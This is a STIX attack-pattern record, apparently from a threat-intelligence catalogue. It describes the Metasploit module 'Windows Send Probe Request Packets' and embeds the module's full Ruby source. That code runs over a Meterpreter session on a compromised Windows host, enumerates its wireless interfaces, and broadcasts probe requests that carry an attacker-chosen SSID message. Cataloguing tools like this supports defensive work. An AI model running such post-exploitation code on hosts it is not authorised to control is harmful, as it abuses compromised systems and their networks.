{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2fc4399e-0cfc-4671-bf8d-3fbaf1257910",
    "created": "2024-08-14T16:33:05.004679Z",
    "modified": "2024-08-14T16:33:05.004682Z",
    "name": "Windows Send Probe Request Packets",
    "description": " This module send probe requests through the wlan interface. The ESSID field will be use to set a custom message.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/wlan/wlan_probe_request.rb",
            "external_id": "wlan_probe_request.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Send Probe Request Packets',\n        'Description' => %q{\n          This module send probe requests through the wlan interface.\n          The ESSID field will be use to set a custom message.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SSID', [true, 'Message to be embedded in the SSID field', '']),\n        OptInt.new('TIMEOUT', [false, 'Timeout in seconds running probes', '30'])\n      ]\n    )\n  end\n\n  def run\n    ssid = datastore['SSID']\n    time = datastore['TIMEOUT']\n\n    if ssid.length > 32\n      print_error('The SSID must be equal to or less than 32 bytes')\n      return\n    end\n\n    mypid = client.sys.process.getpid\n    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)\n    @wlanapi = client.railgun.wlanapi\n\n    wlan_handle = open_handle\n    unless wlan_handle\n      print_error(\"Couldn't open WlanAPI Handle. WLAN API may not be installed on target\")\n      print_error('On Windows XP this could also mean the Wireless Zero Configuration Service is turned off')\n      return\n    end\n\n    # typedef struct _DOT11_SSID {\n    #    ULONG uSSIDLength;\n    #    UCHAR ucSSID[DOT11_SSID_MAX_LENGTH];\n    # } DOT11_SSID, *PDOT11_SSID;\n    pDot11Ssid = [ssid.length].pack('L<') << ssid\n    wlan_iflist = enum_interfaces(wlan_handle)\n    if wlan_iflist.empty?\n      print_status('Wlan interfaces not found')\n      return\n    end\n\n    print_status(\"Wlan interfaces found: #{wlan_iflist.length}\")\n    print_status(\"Sending probe requests for #{time} seconds\")\n    begin\n      ::Timeout.timeout(time) do\n        loop do\n          wlan_iflist.each do |interface|\n            vprint_status(\"Interface Guid: #{interface['guid'].unpack('H*')[0]}\")\n            vprint_status(\"Interface State: #{interface['state']}\")\n            vprint_status(\"DOT11_SSID payload: #{pDot11Ssid.chars.map { |c| c.ord.to_s(16) }.join(':')}\")\n            @wlanapi.WlanScan(wlan_handle, interface['guid'], pDot11Ssid, nil, nil)\n            sleep(10)\n          end\n        end\n      end\n    rescue ::Timeout::Error\n      closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n      if closehandle['return'] == 0\n        print_status('WlanAPI Handle closed successfully')\n      else\n        print_error('There was an error closing the Handle')\n      end\n    end\n  end\n\n  # Function borrowed from @theLightCosine wlan_* modules\n  def open_handle\n    begin\n      wlhandle = @wlanapi.WlanOpenHandle(2, nil, 4, 4)\n    rescue StandardError\n      return nil\n    end\n    return wlhandle['phClientHandle']\n  end\n\n  # Function borrowed from @theLightCosine wlan_* modules\n  def enum_interfaces(wlan_handle)\n    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle, nil, 4)\n    pointer = iflist['ppInterfaceList']\n\n    numifs = @host_process.memory.read(pointer, 4)\n    numifs = numifs.unpack('V')[0]\n\n    interfaces = []\n\n    # Set the pointer ahead to the first element in the array\n    pointer = (pointer + 8)\n    (1..numifs).each do |_i|\n      interface = {}\n      # Read the GUID (16 bytes)\n      interface['guid'] = @host_process.memory.read(pointer, 16)\n      pointer = (pointer + 16)\n      # Read the description(up to 512 bytes)\n      interface['description'] = @host_process.memory.read(pointer, 512)\n      pointer = (pointer + 512)\n      # Read the state of the interface (4 bytes)\n      state = @host_process.memory.read(pointer, 4)\n      pointer = (pointer + 4)\n      # Turn the state into human readable form\n      state = state.unpack('V')[0]\n      case state\n      when 0\n        interface['state'] = 'The interface is not ready to operate.'\n      when 1\n        interface['state'] = 'The interface is connected to a network.'\n      when 2\n        interface['state'] = 'The interface is the first node in an ad hoc network. No peer has connected.'\n      when 3\n        interface['state'] = 'The interface is disconnecting from the current network.'\n      when 4\n        interface['state'] = 'The interface is not connected to any network.'\n      when 5\n        interface['state'] = 'The interface is attempting to associate with a network.'\n      when 6\n        interface['state'] = 'Auto configuration is discovering the settings for the network.'\n      when 7\n        interface['state'] = 'The interface is in the process of authenticating.'\n      else\n        interface['state'] = 'Unknown State'\n      end\n      interfaces << interface\n    end\n    return interfaces\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}